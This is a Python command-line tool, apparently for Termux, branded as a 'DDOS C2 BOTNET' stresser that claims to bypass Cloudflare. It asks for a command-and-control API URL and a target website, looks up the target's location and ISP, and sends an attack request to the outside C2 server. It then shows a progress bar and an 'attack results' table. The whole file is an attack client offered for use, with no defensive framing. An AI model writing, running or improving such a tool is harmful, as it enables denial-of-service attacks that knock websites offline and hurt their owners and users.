import os
import time
import requests
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress
from urllib.parse import urlparse, urlunparse
import re

console = Console()

def L():
    console.clear()
    console.print(Panel.fit("""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣀⡠
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣧
⠀⠀⠀⠀⠀⠀⠈⠀⠄⠀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈ [ # ] Author : Dizflyze
⠀⠀⠀⠀⢀⣁⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢋⣭⡍⣿⣿⣿⣿⣿⣿⠐ [ # ] DDOS C2
⠀⢀⣴⣶⣶⣝⢷⡝⢿⣿⣿⣿⠿⠛⠉⠀⠂⣰⣿⣿⢣⣿⣿⣿⣿⣿⣿⡇ [ # ] Version : v1.3.2
⢀⣾⣿⣿⣿⣿⣧⠻⡌⠿⠋⠡⠁⠈⠀⠀⢰⣿⣿⡏⣸⣿⣿⣿⣿⣿⣿⣿ [ # ] 26 MEI 2025
⣼⣿⣿⣿⣿⣿⣿⡇⠁⠀⠀⠐⠀⠀⠀⠀⠈⠻⢿⠇⢻⣿⣿⣿⣿⣿⣿⡟
⠙⢹⣿⣿⣿⠿⠋⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⡿⠟⠁
⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    """, style="bold magenta"))
    console.print(Panel.fit("DDOS C2 BOTNET DIZ FLYZE FULL BYPASS CLOUDFLARE", style="bold yellow", padding=(1,2)))

def NU(user_input):
    if not re.match(r'^https?://', user_input):
        user_input = 'https://' + user_input
    parsed = urlparse(user_input)
    if not parsed.netloc:
        parsed = parsed._replace(netloc=parsed.path, path='')
    return urlunparse(parsed)

def SA(api_url, target):
    try:
        with console.status("[bold green][ ATTACKING ]", spinner="dots12"):
            info_response = requests.get(f"{api_url}/info?target={target}")
            if info_response.status_code != 200:
                console.print(f"[bold red][ ERROR ] : {info_response.json().get('error', 'Gagal mendapatkan info')}")
                return None
            info = info_response.json()
            response = requests.post(
                f"{api_url}/attack",
                json={"target": target, "apiKey": "TERMUX_KEY"}
            )
            if response.status_code != 200:
                console.print(f"[bold red][ ERROR ] : {response.json().get('error', 'Gagal attack')}")
                return None
            return info
    except Exception as e:
        console.print(f"[bold red] [ GAGAL TERHUBUNG ] : {str(e)}")
        return None

def SR(info):
    table = Table.grid(expand=True)
    table.add_column(style="cyan", width=20)
    table.add_column(style="magenta")
    table.add_row("Target", info.get('query', '-'))
    table.add_row("Lokasi", f"{info.get('city', '-')}, {info.get('country', '-')}")
    table.add_row("ISP", info.get('isp', '-'))
    table.add_row("Organisasi", info.get('org', '-'))
    table.add_row("ASN", info.get('as', '-'))
    table.add_row("Zona Waktu", info.get('timezone', '-'))
    table.add_row("Koordinat", f"Lat: {info.get('lat', '-')}, Lon: {info.get('lon', '-')}")
    table.add_row("Status", "[bold green]SUCCESSFULY[/]")
    console.print(Panel.fit(
        table,
        title="[bold yellow][ HASIL ATTACKING ]",
        subtitle="[bold green][ TIME ATTACK ] : [ 60 SEC ]",
        style="bold white"
    ))

def main():
    L()
    api_url = console.input("[bold white]╔═(api)Dizflyze Streser)\n╚═══➤ ")
    L()
    target_input = console.input("[bold white]╔═(link)Dizflyze Streser)\n╚═══➤ ")
    target = NU(target_input)
    L()
    with Progress(transient=True) as progress:
        task = progress.add_task("[bold red] [ ATTACKING ]", total=100)
        info = SA(api_url, target)
        if not info:
            return
        for i in range(100):
            progress.update(task, advance=1, description=f"[bold yellow][ STATUS ] : ({i+1}%)")
            time.sleep(0.6)
    L()
    SR(info)

if __name__ == "__main__":
    main()
